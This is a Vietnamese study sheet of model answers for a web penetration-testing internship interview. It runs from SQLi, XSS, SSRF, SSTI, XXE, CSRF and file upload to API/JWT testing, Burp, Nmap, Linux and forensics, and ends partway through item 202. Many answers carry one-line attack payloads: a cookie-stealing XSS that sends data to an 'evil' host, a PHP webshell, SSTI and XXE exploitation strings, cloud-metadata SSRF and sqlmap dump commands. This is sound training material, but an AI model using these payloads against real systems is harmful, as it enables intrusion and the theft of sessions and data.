---
title: "tra loi pv"
---

# Trả lời mẫu phỏng vấn - Mẫu + Ví dụ

> Format mỗi câu: Mẫu trả lời -> Ví dụ cụ thể để hiểu. Ngắn gọn để thuộc đi phỏng vấn.

## 1. Giới thiệu bản thân
### 1. Giới thiệu 1-2 phút
Mẫu: Em là sinh viên An toàn thông tin năm 3, định hướng Web/API Pentest, từng intern Web Pentest, final PTIT CTF, luyện PortSwigger + THM.
VD: Em từng test auth/session/access control và viết report có remediation cho dev.

### 2. Tại sao học InfoSec?
Mẫu: Thích tư duy tìm lỗi logic + được hack hợp pháp, thấy web là mặt tiền dễ bị tấn công nhất.
VD: Từ giải CTF web đầu tiên lấy flag bằng IDOR thì quyết theo web.

### 3. Tại sao chọn Web Pentest?
Mẫu: Web/API là bề mặt phổ biến nhất, gần code, dễ thấy impact business, phù hợp green.
VD: 1 lỗi IDOR lộ data 10k user giá trị hơn 1 lỗi cấu hình máy lẻ.

### 4. Tại sao muốn vào VinSOC?
Mẫu: Muốn làm SOC + pentest trong môi trường ISP lớn, học monitoring + incident thật, traffic thật.
VD: ISP có DNS, core network, portal khách hàng rất đáng test.

### 5. Mục tiêu 1-3 năm?
Mẫu: 1 năm vững web/API + report chuẩn, 3 năm OSCP/BSCP + làm được mobile API + red team cơ bản.
VD: 6 tháng tới xong hết P0 PortSwigger còn thiếu.

### 6. Điểm mạnh?
Mẫu: Mạnh web: SQLi/XSS/IDOR/SSRF, dùng Burp thạo, đọc PHP/JS cơ bản, chăm viết writeup.
VD: Tự dựng PHP vulnerable web để học file upload.

### 7. Điểm yếu?
Mẫu: Yếu binary/pwn, AD, còn chậm khi gặp WAF/smuggling, đang vá theo checklist.
VD: Chưa xong JWT/OAuth nâng cao, đang lab lại.

### 8. Đã làm gì ngoài học?
Mẫu: Intern 7 tháng, CTF final, 3 project GitHub, blog writeup, THM rooms.
VD: github.com/taind345 có PHP vulnerable + Pomodoro + deepfake.

### 9. Tự tin nhất CV?
Mẫu: Project PHP vulnerable vì tự design lỗi + exploit + fix, kể được code tới PoC.
VD: File upload bypass extension -> webshell -> fix whitelist + random name.

### 10. Web Pentester cần gì?
Mẫu: HTTP, auth/session/access control, OWASP Top10, Burp, đọc code, viết report, đạo đức scope.
VD: Không RCE production khi chưa cho phép, dừng và báo ngay.

## 2. Kinh nghiệm Intern 11-40
### 11. Công việc hằng ngày?
Mẫu: Nhận scope/staging, recon, test checklist OWASP, log finding, viết report, retest.
VD: Sáng test login/reset, chiều test API bằng Burp + Postman.

### 12. Quy trình pentest?
Mẫu: Scope -> recon -> mapping -> vuln scan + manual -> exploit PoC nhẹ -> đánh giá CVSS -> report -> retest.
VD: Không scan intrusive production giờ cao điểm.

### 13. Nhận target mới làm gì đầu tiên?
Mẫu: Đọc scope, check in-scope/out-of-scope, mapping domain/sub, xem tech stack.
VD: Dùng Burp sitemap + ffuf dir + check robots.txt.

### 14. Recon web gồm gì?
Mẫu: Subdomain, dir/file, JS endpoint, API doc, header, version, .git/.bak.
VD: JS bundle lộ /api/v1/admin.

### 15. Dùng Burp thế nào?
Mẫu: Proxy intercept -> Repeater sửa -> Intruder fuzz/brute -> Decoder/Comparer check.
VD: Intercept login, Repeater đổi role=user->admin.

### 16. Proxy/Repeater/Intruder/Decoder/Comparer?
Mẫu: Proxy chặn, Repeater sửa tay resend, Intruder auto fuzz 4 mode Sniper/Battering/Pitchfork/Cluster, Decoder encode/decode, Comparer diff response.
VD: Intruder Cluster bomb brute user+pass, Comparer diff True/False blind SQLi.

### 17. Thấy request đáng ngờ phân tích sao?
Mẫu: Xem method/param/cookie/auth, đoán backend xử lý, Repeater đổi từng param, xem status/length/time.
VD: `GET /api/user/123` đổi 124 xem lộ data user khác -> IDOR.

### 18. Vuln vs issue?
Mẫu: Vuln khai thác được + có impact, issue là best-practice/rủi ro thấp chưa chứng minh.
VD: Missing HttpOnly là issue, XSS cắp session là vuln.

### 19. Xác minh tránh false positive?
Mẫu: Reproduce 2 lần, đổi session khác, check log, manual lại sau scanner.
VD: Scanner báo SQLi nhưng Repeater không lệch -> false positive.

### 20. Sau phát hiện vuln làm gì?
Mẫu: Chụp PoC, đánh impact, không leo sâu, ghi steps, đề xuất fix, báo lead nếu critical.
VD: Thấy RCE chỉ `whoami` rồi dừng, không cat /etc/shadow khách thật.

### 21. Pentest API check gì?
Mẫu: Auth, BOLA/IDOR, mass assignment, rate limit, method, version cũ, injection.
VD: `PUT /api/user/123 {"role":"admin"}` mass assignment.

### 22. REST API khác web truyền thống?
Mẫu: API trả JSON không UI, auth bằng token, versioning, logic ở client nhiều, phải đọc doc/Swagger.
VD: Không có form nên phải fuzz JSON field.

### 23. GET/POST/PUT/PATCH/DELETE?
Mẫu: GET đọc, POST tạo, PUT thay toàn bộ, PATCH sửa 1 phần, DELETE xóa. GET không đổi state.
VD: Đổi GET thành POST bypass access control chỉ chặn GET.

### 24. Authentication vs Authorization?
Mẫu: Auth là ai (login), Author là được làm gì (quyền). Bypass auth vào được, bypass author làm việc trái quyền.
VD: Login vào là auth, user đọc admin bill là author fail.

### 25. Session quản lý thế nào?
Mẫu: Server sinh sessionID random sau login, lưu cookie, check mỗi request, expire khi logout/timeout.
VD: Cookie `session=abc123; HttpOnly; Secure; SameSite=Lax`.

### 26. Session fixation?
Mẫu: Attacker ép nạn nhân dùng sessionID biết trước, nạn nhân login -> attacker dùng luôn ID đó vào.
VD: Gửi link `?sessionid=123`, nạn nhân login, attacker dùng 123 vào.

### 27. Session hijacking?
Mẫu: Cắp sessionID đang active qua XSS/sniff để mạo danh.
VD: XSS `<script>fetch(evil+document.cookie)</script>` rồi dùng cookie đó.

### 28. Test logout thế nào?
Mẫu: Logout rồi dùng lại cookie cũ, thử back, thử API với token cũ, check server invalidate chưa.
VD: Logout mà Repeater với cookie cũ vẫn 200 -> lỗi.

### 29. Test password reset thế nào?
Mẫu: Check token random/expire, host header poisoning, leak qua Referer, user enum, rate limit.
VD: Reset link `https://evil.com/reset?token=123` do Host injection.

### 30. Test Access Control thế nào?
Mẫu: 2 account low/high, thử truy cập chéo URL/API/method, ẩn param.
VD: User A `GET /order/1001` đổi 1002 xem order B.

### 31. Xử lý khi IDOR?
Mẫu: Xác minh 2 account, chụp 2 response khác user, không dump hàng loạt, đánh impact PII.
VD: Chỉ demo 2 ID, không script lấy 10k.

### 32. Business Logic flaw?
Mẫu: Lỗi luồng nghiệp vụ đúng code nhưng sai logic tiền/quyền, scanner không thấy.
VD: Giảm giá về âm, coupon dùng lại vô hạn.

### 33. Business Logic khác SQLi?
Mẫu: SQLi là lỗi kỹ thuật inject, logic là abuse flow hợp lệ. Logic cần hiểu business.
VD: SQLi dùng `' OR 1=1`, logic dùng mua 1 áp coupon 10 lần.

### 34. Frontend vs backend validation?
Mẫu: Tắt JS/bypass bằng Repeater, nếu server vẫn chặn là backend, nếu lọt là chỉ frontend.
VD: Maxlength HTML=10 nhưng Repeater gửi 1000 vẫn qua -> chỉ frontend.

### 35. Dev nói chỉ client-side?
Mẫu: Chứng minh bypass bằng Burp không qua UI, show impact thật.
VD: Giá sửa ở DevTools gửi lên vẫn thanh toán -> backend lỗi thật.

### 36. Đánh giá severity dựa gì?
Mẫu: Impact x Exploitability, theo CVSS + data affected + cần auth không.
VD: RCE public 9.8, self-XSS 4.x.

### 37. Report tốt gồm gì?
Mẫu: Title, severity, endpoint, steps, PoC, impact, root cause, remediation, ref.
VD: Kèm request/response Burp để dev reproduce.

### 38. Viết remediation sao dev sửa được?
Mẫu: Nêu code cụ thể + lib + ví dụ, không chung chung.
VD: Dùng prepared statement `cursor.execute("... WHERE id=%s",(id,))` thay f-string.

### 39. Dev phản biện?
Mẫu: Lắng nghe, reproduce lại cùng, đưa OWASP/CVSS/PoC, giữ thái độ hỗ trợ.
VD: Mở Burp demo lại trước mặt dev.

### 40. Chứng minh impact?
Mẫu: PoC an toàn tối thiểu: đọc email mình từ ID khác, `whoami`, không lấy data thật hàng loạt.
VD: Dùng 2 test account chứng minh A đọc B.

## 3. SQLi 41-53
### 41. SQLi là gì?
Mẫu: Chèn SQL đổi logic query.
VD: `' OR '1'='1` bypass login.

### 42. Vì sao xảy ra?
Mẫu: Ghép chuỗi input vào query, không prepared.
VD: `"SELECT * FROM users WHERE id='"+input+"'"`.

### 43. Union-based?
Mẫu: Dùng UNION nối data khác vào response, cần khớp số cột.
VD: `ORDER BY 3-- -` rồi `UNION SELECT NULL,user,pass FROM users-- -`.

### 44. Error-based?
Mẫu: Ép lỗi hiện data trong lỗi.
VD: `' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -`.

### 45. Boolean Blind?
Mẫu: Không hiện data, chỉ True/False khác nhau, hỏi từng char.
VD: `' AND SUBSTRING(pass,1,1)='a'-- -` xem length khác.

### 46. Time Blind?
Mẫu: Không phân biệt True/False, dùng sleep đo giờ.
VD: `' AND IF(1=1,SLEEP(5),0)-- -` delay 5s là true.

### 47. Auth bypass SQLi?
Mẫu: Biến WHERE luôn đúng.
VD: `admin' OR '1'='1'-- -`.

### 48. Phát hiện param SQLi?
Mẫu: Thêm `' " AND 1=1/1=2`, SLEEP, xem error/length/time.
VD: `id=1 AND 1=1` 200, `id=1 AND 1=2` khác -> nghi.

### 49. Không trả error test sao?
Mẫu: Chuyển blind + OOB.
VD: Boolean diff + `SLEEP(5)` + Collaborator DNS.

### 50. Prepared Statement?
Mẫu: Tách code-data, query biên dịch trước với `?`, data chỉ là literal.
VD: `SELECT * FROM u WHERE id=?` + `(id,)`.

### 51. ORM hết SQLi?
Mẫu: Không, nếu dùng raw/order nhập từ user.
VD: `order_by(request.GET['sort'])` vẫn inject, `raw(f"SELECT...{id}")` vẫn dính.

### 52. SQLmap?
Mẫu: Auto fingerprint -> test techniques -> dump `--dbs --tables --dump`.
VD: `sqlmap -u "site?id=1" --dbs --tamper=space2comment`.

### 53. Khi nào không dùng SQLmap?
Mẫu: Production sợ DoS, WAF chặn, logic phức tạp cần manual, chỉ cần PoC nhẹ.
VD: Chỉ demo `AND SLEEP(5)` bằng Repeater, không dump full.

## 4. XSS 54-66
### 54. XSS?
Mẫu: Chèn JS chạy trong browser nạn nhân.
VD: Comment `<script>fetch(evil+document.cookie)</script>`.

### 55. Reflected/Stored/DOM?
Mẫu: Reflected qua request cần click, Stored lưu DB ai xem cũng dính, DOM lỗi ở JS client.
VD: Reflected `?q=<script>`, Stored comment, DOM `location.hash->innerHTML`.

### 56. Source Sink?
Mẫu: Source vào, Sink thực thi.
VD: `location.search` -> `innerHTML` = DOM XSS.

### 57. innerHTML nguy hiểm?
Mẫu: Parse string thành HTML/JS.
VD: `div.innerHTML=location.search` + `? <img src=x onerror=alert(1)>`.

### 58. textContent khác?
Mẫu: textContent chỉ text, không parse tag nên an toàn.
VD: Dùng `textContent=userInput` thay innerHTML.

### 59. Event handler?
Mẫu: Chèn qua `onerror/onload/onfocus`.
VD: `" onfocus=alert(1) autofocus="`.

### 60. HTML encoding ngăn?
Mẫu: Biến `<>"` thành `&lt;&gt;` nên không thành tag.
VD: `<` -> `&lt;` hiện chữ.

### 61. JS vs HTML escaping?
Mẫu: Khác context, dùng sai vẫn dính.
VD: Trong `var x='INPUT'` phải escape `'`, encode HTML không đủ.

### 62. CSP?
Mẫu: Header whitelist nguồn script.
VD: `script-src 'self'` chặn inline + domain lạ.

### 63. CSP tuyệt đối?
Mẫu: Không, sai `unsafe-inline/*` + JSONP là bypass.
VD: Whitelist `*.googleapis.com` có JSONP -> bypass.

### 64. Bypass CSP?
Mẫu: Check unsafe, tìm JSONP/upload trên trusted, dangling markup.
VD: `<script src=https://trusted/jsonp?callback=alert(1)>`.

### 65. DOM khác Reflected?
Mẫu: Reflected server reflect, DOM server trả JS tĩnh browser tự sink.
VD: Burp response không thấy payload nhưng hash vẫn chạy.

### 66. jQuery attr sink?
Mẫu: Lấy input gán href/attr nguy hiểm.
VD: `$(a).attr('href',location.search)` + `?javascript:alert(1)`.

## 5. SSRF/SSTI/XXE/CSRF 67-86
### 67. SSRF?
Mẫu: Ép server gửi request tới nội bộ.
VD: `?url=http://169.254.169.254/latest/meta-data/`.

### 68. SSRF khác CSRF?
Mẫu: SSRF server gửi, CSRF browser nạn nhân gửi kèm cookie.
VD: SSRF đọc metadata, CSRF đổi email nạn nhân.

### 69. Blind SSRF?
Mẫu: Không thấy response, chỉ OOB.
VD: `?url=https://collab.oastify.com` xem ping về.

### 70. SSRF tới đâu?
Mẫu: localhost, LAN, cloud metadata, service nội bộ.
VD: `http://127.0.0.1:8080/admin`.

### 71. Vì sao 127.0.0.1?
Mẫu: Là loopback của server, vào được service chỉ listen local.
VD: Redis/Mongo admin local không auth.

### 72. Metadata compromise?
Mẫu: Cloud cho key qua `169.254.169.254`, SSRF lấy key -> chiếm cloud.
VD: Lấy `iam/security-credentials/` rồi dùng AWS CLI.

### 73. URL parser bypass?
Mẫu: Lách blacklist bằng encode/IP khác/redirect/@.
VD: `0.0.0.0`, `2130706433`, `localhost%2eattacker.com`, `evil%40whitelist`.

### 74. SSTI?
Mẫu: Nhúng input vào template server render thành code.
VD: `{{7*7}}` trả 49 -> SSTI.

### 75. SSTI khác XSS?
Mẫu: XSS chạy ở browser, SSTI chạy ở server -> RCE.
VD: XSS cắp cookie, SSTI `{{self._module...popen('id')}}` RCE.

### 76. Xác định engine?
Mẫu: Thử polyglot + xem lỗi.
VD: `{{7*'7'}}` 49 là Twig, 7777777 là Jinja2.

### 77. Jinja2?
Mẫu: Template Python Flask.
VD: `{{config}}`, `{{request}}` rồi leo `os.popen`.

### 78. SSTI RCE?
Mẫu: Thoát sandbox gọi os/system.
VD: Jinja2 `{{cycler.__init__.__globals__.os.popen('id').read()}}`.

### 79. XXE?
Mẫu: XML parser xử lý entity ngoài.
VD: Upload XML/SVG/Office có ENTITY.

### 80. External Entity?
Mẫu: Thực thể trỏ file/URL ngoài.
VD: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` rồi `&xxe;`.

### 81. XXE đọc file?
Mẫu: Khai báo entity file rồi in ra response.
VD: `<foo>&xxe;</foo>` trả nội dung passwd.

### 82. Blind XXE?
Mẫu: Không in ra, exfil OOB/error.
VD: Entity trỏ `http://collab/?x=file content` hoặc error-based.

### 83. CSRF?
Mẫu: Lợi dụng browser tự gửi cookie nạn nhân.
VD: Trang evil auto-submit `POST /change-email` khi nạn nhân đã login.

### 84. CSRF khác XSS?
Mẫu: CSRF dùng quyền nạn nhân không cần JS, XSS chạy JS trong origin.
VD: CSRF đổi pass, XSS cắp token để bypass CSRF.

### 85. CSRF Token?
Mẫu: Token random gắn session, server check mỗi state-change.
VD: `csrf=abc123` hidden field, thiếu/sai thì 403. Lỗi hay gặp token không bind session.

### 86. SameSite giảm CSRF?
Mẫu: Chặn browser gửi cookie cross-site.
VD: `SameSite=Lax` chặn POST cross, `Strict` chặn cả GET, bypass via sibling/client-redirect.

## 6. Auth/Access/Upload 87-103
### 87. Broken Access Control?
Mẫu: Không check quyền khi truy object/chức năng.
VD: User vào `/admin` vẫn 200.

### 88. Vertical?
Mẫu: Low leo lên high/admin.
VD: User đổi `role=user` thành admin.

### 89. Horizontal?
Mẫu: Ngang cấp đọc nhau.
VD: `user/1001` đổi 1002.

### 90. Test author API?
Mẫu: 2 token A/B, thử chéo mọi endpoint/method.
VD: Token A `GET /api/order/1002` của B vẫn 200 -> BOLA.

### 91. Phát hiện IDOR?
Mẫu: Tìm ID tuần tự/UUID, đổi số, encode base64, test 2 account.
VD: `/profile?user_id=1305` -> 1000.

### 92. IDOR vs BAC?
Mẫu: IDOR là 1 dạng BAC, BAC rộng hơn gồm cả function-level.
VD: IDOR đổi ID, BAC vào chức năng admin.

### 93. Auth Bypass?
Mẫu: Vào được không cần cred đúng.
VD: `admin'--`, force browse `/dashboard`, JWT alg none.

### 94. Lỗi dẫn bypass?
Mẫu: SQLi login, logic reset, JWT none, session fixation, dir brute.
VD: `?admin=true` cookie.

### 95. Reset hay lỗi đâu?
Mẫu: Token đoán được, không expire, leak Referer, Host poisoning, user enum.
VD: Token `123456` 6 số brute được.

### 96. MFA bypass?
Mẫu: Skip step, brute OTP, response tamper, không bind session.
VD: POST `/verify` đổi `success:false` thành true.

### 97. File Upload?
Mẫu: Upload file độc lên rồi thực thi.
VD: Upload `shell.php` rồi `GET /uploads/shell.php?cmd=id`.

### 98. Check ext đủ?
Mẫu: Không, bypass double ext/case/null.
VD: `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg`.

### 99. MIME bypass?
Mẫu: Được, vì header do client gửi.
VD: Repeater đổi `Content-Type: image/jpeg` cho file php.

### 100. PHP RCE?
Mẫu: Upload webshell rồi gọi URL.
VD: `<?php system($_GET['cmd']);?>` rồi `?cmd=whoami`.

### 101. Secure Upload?
Mẫu: Whitelist ext, check content/magic, random name, ngoài webroot, không execute, AV.
VD: Chỉ `jpg/png`, lưu `uuid.jpg`, `chmod` no exec.

### 102. Misconfig?
Mẫu: Cấu hình mặc định/thừa/debug mở.
VD: Dir listing, default cred admin:admin.

### 103. VD Misconfig?
Mẫu: `.git` lộ, verbose error, S3 public, backup `.bak`.
VD: `/.git/HEAD` đọc được source.

## 7. API 104-118
### 104. API khác Web?
Mẫu: API JSON không UI, auth token, phải đọc doc, test mass/rate/BOLA.
VD: Fuzz field JSON thay vì form.

### 105. Test auth API?
Mẫu: Thử no token, token hết hạn, token user khác, brute.
VD: Bỏ `Authorization: Bearer` vẫn 200 -> lỗi.

### 106. JWT?
Mẫu: Token login gồm 3 phần base64.
VD: Dùng ở `Authorization: Bearer eyJ...`.

### 107. 3 phần?
Mẫu: Header.Payload.Signature.
VD: `eyJhbGciOi... . eyJ1c2Vy... . SflK...`.

### 108. Sửa payload được?
Mẫu: Sửa được nhưng phải qua signature, nếu server không verify thì được.
VD: Đổi `"role":"user"` thành admin rồi gửi.

### 109. alg none?
Mẫu: Bỏ signature vẫn chấp nhận.
VD: Đổi header `{"alg":"none"}` xóa phần 3.

### 110. Signature để gì?
Mẫu: Đảm bảo token không bị sửa, chỉ server có secret mới ký.
VD: RS256->HS256 confusion dùng public key làm secret.

### 111. BOLA/IDOR API?
Mẫu: Object-level không check chủ sở hữu.
VD: `/api/v1/users/123` đổi 124.

### 112. Mass Assignment?
Mẫu: Gửi thêm field ẩn server tự bind.
VD: `{"name":"a","role":"admin","is_admin":true}`.

### 113. Rate Limit?
Mẫu: Giới hạn số request chống brute/spam.
VD: Login 5 lần/phút, quá thì 429.

### 114. Test rate?
Mẫu: Intruder 20 req nhanh xem chặn không, đổi IP/X-Forwarded-For.
VD: Không 429 + đổi header bypass -> lỗi.

### 115. API SQLi?
Mẫu: Có, nếu JSON field ghép query.
VD: `{"search":"' OR 1=1-- -"}`.

### 116. API SSRF?
Mẫu: Có, field URL/import/webhook.
VD: `{"avatar_url":"http://169.254.169.254/"}`.

### 117. Postman khi nào?
Mẫu: Dùng explore/test API có doc, lưu collection, đổi env.
VD: Import Swagger rồi test từng endpoint.

### 118. Burp vs Postman?
Mẫu: Postman tiện chức năng, Burp để intercept/fuzz/security.
VD: Cần sửa raw + Intruder thì Burp, cần flow đúng thì Postman.

## 8. Burp/ZAP 119-129
### 119. Proxy?
Mẫu: Chặn xem/sửa traffic giữa browser-server.
VD: Bật intercept đổi giá tiền trước khi gửi.

### 120. Repeater?
Mẫu: Sửa tay resend từng request.
VD: Đổi `id=1` thành inject test.

### 121. Intruder?
Mẫu: Auto fuzz/brute nhiều payload.
VD: Cluster bomb brute user/pass.

### 122. Scanner hạn chế?
Mẫu: Miss logic/IDOR, false positive, không hiểu business.
VD: Scanner báo sạch nhưng manual IDOR vẫn dính.

### 123. Intercept HTTPS?
Mẫu: Cài Burp CA vào browser, proxy qua 8080.
VD: Install `http://burp/cert` rồi bật intercept.

### 124. CA để gì?
Mẫu: Burp tự ký cert để giải mã TLS.
VD: Không cài thì báo HSTS/cert error.

### 125. Scope?
Mẫu: Giới hạn target test, tránh out-of-scope.
VD: Add `*.target.com` vào scope, drop còn lại.

### 126. History?
Mẫu: Log mọi request để trace/mapping.
VD: Tìm lại login request hôm qua.

### 127. Sửa resend?
Mẫu: Repeater -> edit -> Send.
VD: Chuột phải Send to Repeater.

### 128. ZAP khác Burp?
Mẫu: ZAP free open, auto scan mạnh, Burp manual + Intruder + ext mạnh hơn.
VD: Newbie/ZAP spider nhanh, pro pentest chọn Burp Pro.

### 129. Chọn Burp/ZAP?
Mẫu: Có license + cần manual sâu chọn Burp, không tiền + cần auto chọn ZAP.
VD: CTF/API manual -> Burp, scan nhanh -> ZAP.

## 9. Nmap/Recon 130-142
### 130. Nmap?
Mẫu: Scan port/service/OS.
VD: `nmap -sV target`.

### 131. SYN Scan?
Mẫu: Gửi SYN không full handshake, nhanh kín.
VD: SYN->SYN/ACK là open, RST là close.

### 132. -sS/-sT/-sU?
Mẫu: sS SYN lén, sT connect đầy đủ, sU UDP chậm.
VD: Firewall chặn thì sS qua, sT dễ log.

### 133. -sV?
Mẫu: Detect version service.
VD: `80 Apache 2.4.49` -> tra CVE.

### 134. -O?
Mẫu: Đoán OS qua TCP stack.
VD: Linux 5.x vs Windows.

### 135. -Pn?
Mẫu: Bỏ ping, scan khi host chặn ICMP.
VD: Target không ping vẫn scan.

### 136. -p-?
Mẫu: Scan full 65535 port.
VD: Tìm service lạ port cao.

### 137. Scan subnet?
Mẫu: CIDR + ping sweep.
VD: `nmap -sn 192.168.1.0/24` rồi `-sV` host sống.

### 138. Dirsearch/Gobuster/Ffuf?
Mẫu: Fuzz dir/file ẩn.
VD: `ffuf -u site/FUZZ -w common.txt`.

### 139. Directory fuzzing?
Mẫu: Đoán path ẩn bằng wordlist.
VD: Tìm `/admin/.bak`.

### 140. Ffuf khác Gobuster?
Mẫu: Ffuf fuzz mọi chỗ nhanh đa dạng, Gobuster chuyên dir/dns đơn giản.
VD: Ffuf fuzz param/header/vhost, Gobuster dir gọn.

### 141. Nessus khi nào?
Mẫu: Giai đoạn vuln scan sau recon, trước manual.
VD: Chạy Nessus lấy CVE rồi verify tay.

### 142. Nmap có phải vuln scanner?
Mẫu: Không, chủ yếu discovery, NSE chỉ hỗ trợ.
VD: Nmap tìm port, Nessus/OpenVAS mới scan vuln.

## 10. Network 143-162
### 143. TCP/IP layers?
Mẫu: 4 lớp: Link-Internet-Transport-Application.
VD: IP ở Internet, TCP ở Transport, HTTP ở App.

### 144. TCP vs UDP?
Mẫu: TCP tin cậy có handshake, UDP nhanh không đảm bảo.
VD: Web/SSH dùng TCP, DNS/Video dùng UDP.

### 145. 3-way handshake?
Mẫu: SYN -> SYN/ACK -> ACK.
VD: Wireshark thấy 3 gói mở 443.

### 146. HTTPS?
Mẫu: HTTP + TLS mã hóa.
VD: Chống sniff pass.

### 147. TLS handshake?
Mẫu: ClientHello -> ServerHello+cert -> key exchange -> Finished mã hóa.
VD: Check cert Burp CA bước này.

### 148. HTTP vs HTTPS?
Mẫu: HTTPS mã hóa + cert, HTTP plain.
VD: Sniff HTTP thấy pass, HTTPS chỉ thấy cipher.

### 149. HTTP request?
Mẫu: Method + path + version + headers + body.
VD: `POST /login` + `Cookie:` + `user=a&pass=b`.

### 150. HTTP response?
Mẫu: Status + headers + body.
VD: `200 + Set-Cookie + HTML`.

### 151. Cookie?
Mẫu: Server lưu định danh ở browser gửi kèm mỗi request.
VD: `sessionid=abc`.

### 152. Session vs Cookie?
Mẫu: Session data ở server, cookie data ở client. Cookie chứa sessionID.
VD: Xóa cookie mất login.

### 153. DNS?
Mẫu: Dịch tên thành IP đệ quy.
VD: `bank.com` -> 1.2.3.4 qua resolver->root->TLD.

### 154. A/AAAA/CNAME/MX/TXT?
Mẫu: A IPv4, AAAA IPv6, CNAME alias, MX mail, TXT verify/SPF.
VD: `mail` MX trỏ mail server.

### 155. Status code?
Mẫu: 200 ok, 301/302 redirect, 400 bad req, 401 chưa auth, 403 cấm, 404 không thấy, 500 lỗi server.
VD: IDOR 200 lộ, chặn 403.

### 156. 401 vs 403?
Mẫu: 401 chưa login, 403 login rồi nhưng không quyền.
VD: Không token 401, user vào admin 403.

### 157. Header pentest?
Mẫu: Cookie, Auth, Origin/Referer, X-Forwarded-Host, CORS, CSP, Server.
VD: `X-Forwarded-Host: evil` test poisoning.

### 158. CORS?
Mẫu: Cơ chế cho cross-origin có kiểm soát.
VD: `Access-Control-Allow-Origin: evil.com` + cred true là lỗi.

### 159. SOP?
Mẫu: Chặn web khác origin đọc data nhau.
VD: evil.com không đọc bank.com response nếu không CORS.

### 160. Reverse Proxy?
Mẫu: Đứng trước server nhận request hộ.
VD: Nginx/WAF lọc trước khi tới app.

### 161. Load Balancer?
Mẫu: Chia tải nhiều backend, nằm sau proxy/WAF trước app.
VD: Sticky session, smuggling do front/back khác nhau.

### 162. Web vs App server?
Mẫu: Web phục vụ tĩnh/HTTP, app chạy logic/code.
VD: Nginx web, Tomcat/Django app.

## 11. Linux 163-176
### 163. Process?
Mẫu: Chương trình đang chạy có PID.
VD: `ps aux | grep apache`.

### 164. ps/top/grep/awk/sed?
Mẫu: ps liệt kê, top realtime, grep lọc, awk cắt cột, sed thay text.
VD: `ps aux | grep ssh | awk '{print $2}'`.

### 165. chmod 755?
Mẫu: owner rwx, group/other r-x.
VD: Script web cần 755 để chạy.

### 166. rwx?
Mẫu: r đọc, w ghi, x chạy. Dir x là vào được.
VD: `644` file, `755` folder/script.

### 167. passwd vs shadow?
Mẫu: passwd thông tin user public, shadow chứa hash pass chỉ root.
VD: LFI đọc passwd, cần root mới đọc shadow.

### 168. Env var?
Mẫu: Biến môi trường chứa config/secret.
VD: `env | grep API_KEY`, SSTI đọc `os.environ`.

### 169. Pipe?
Mẫu: Chuyền output lệnh trước thành input sau.
VD: `cat log | grep 403`.

### 170. `>/>>/<?`
Mẫu: `>` ghi đè, `>>` nối, `<` đọc vào.
VD: `echo shell >> file`.

### 171. curl?
Mẫu: Gửi HTTP/API nhanh từ terminal.
VD: `curl -X POST -d '{"id":1}' -H "Auth: x" site/api`.

### 172. wget?
Mẫu: Tải file.
VD: `wget http://site/shell.sh`.

### 173. SSH?
Mẫu: Remote mã hóa qua 22, key/pass.
VD: `ssh user@ip -i key`.

### 174. Port listen?
Mẫu: `ss -tulpn` / `netstat`.
VD: `ss -tlnp | grep 8080`.

### 175. IP/interface?
Mẫu: `ip a` / `ifconfig`.
VD: `ip a | grep inet`.

### 176. Process vs thread?
Mẫu: Process độc lập memory, thread chia memory trong process.
VD: Apache mỗi req 1 thread.

## 12. Forensics 177-195
### 177. DF là gì?
Mẫu: Thu thập phân tích chứng cứ số hợp pháp.
VD: Tìm flag từ pcap/memory.

### 178. Quy trình?
Mẫu: Bảo toàn -> thu thập -> phân tích -> báo cáo.
VD: Hash trước khi mở file.

### 179. Evidence?
Mẫu: Dữ liệu chứng minh sự kiện.
VD: Log + pcap + hash.

### 180. Vì sao bảo toàn?
Mẫu: Tránh sửa mất giá trị pháp lý.
VD: Mount read-only + hash SHA256.

### 181. Hash?
Mẫu: Chứng minh nguyên vẹn.
VD: So hash trước/sau giống nhau.

### 182. Carving?
Mẫu: Khôi phục file đã xóa từ raw.
VD: `foremost/binwalk` móc jpg từ dump.

### 183. Metadata?
Mẫu: Thông tin về file: GPS, tác giả, giờ.
VD: `exiftool img.jpg` lộ GPS OSINT.

### 184. Log analysis?
Mẫu: Soi log tìm tấn công.
VD: Grep `../`, `UNION`, 403 lặp.

### 185. Log hữu ích?
Mẫu: Access, error, auth, firewall, DNS.
VD: `/var/log/auth.log` brute SSH.

### 186. Wireshark?
Mẫu: Bắt/phân tích gói tin.
VD: Mở pcap tìm flag.

### 187. Lọc HTTP?
Mẫu: `http`, `http.request`, `ip.addr==`.
VD: `http contains "flag"`.

### 188. Tìm IP đáng ngờ?
Mẫu: Thống kê conversation, beacon đều, IP lạ port lạ.
VD: `Statistics->Conversations` thấy beacon 10s/lần.

### 189. TCP stream?
Mẫu: Gộp gói thành hội thoại.
VD: Follow TCP stream đọc login plain.

### 190. PCAP?
Mẫu: File capture gói tin.
VD: `capture.pcap` mở Wireshark.

### 191. Dấu C2?
Mẫu: Beacon đều, DNS lạ, POST nhỏ đều, UA lạ.
VD: POST 5 phút/lần tới domain random.

### 192. Bình thường vs nghi?
Mẫu: Bình thường đa dạng, nghi lặp pattern/giờ lẻ/dung lượng lệch.
VD: GET /login 1000 lần/phút là brute.

### 193. Chain of Custody?
Mẫu: Sổ ghi ai giữ evidence khi nào để hợp pháp.
VD: Ghi hash + người + giờ bàn giao.

### 194. Volatility?
Mẫu: Phân tích RAM: process, net, cred.
VD: `vol.py -f mem.raw windows.pslist`.

### 195. Disk vs Network?
Mẫu: Disk xem file/log đã lưu, Network xem traffic realtime/pcap.
VD: Disk carving, Network follow stream.

## 13. CTF 196-205
### 196. PTIT thế nào?
Mẫu: Team Blue_whale vào final, em phụ trách web/forensics.
VD: Chia web/re/pwn, em ăn web.

### 197. Phân công?
Mẫu: Theo sở trường, web em, share Burp notes.
VD: Em recon web, bạn khác forensics.

### 198. Web khó nhất?
Mẫu: Kể 1 bài SSTI->RCE lấy flag.
VD: `{{7*7}}` -> Jinja2 -> `popen('cat /flag')`.

### 199. Exploit CTF?
Mẫu: SQLi dump cred -> login -> IDOR lấy flag.
VD: `' UNION SELECT flag-- -`.

### 200. Không giải được?
Mẫu: Thừa nhận + rút kinh nghiệm đọc writeup.
VD: Pwn heap chưa biết, sau học lại buffer overflow cơ bản.

### 201. Stuck?
Mẫu: Đổi vector, check lại source/hint, bỏ qua quay lại, đọc writeup tương tự.
VD: Ffuf thêm extension, xem JS.

### 202. Bắt đầu web?
Mẫu: Xem source/robots/JS, Burp history, thử login/ID.
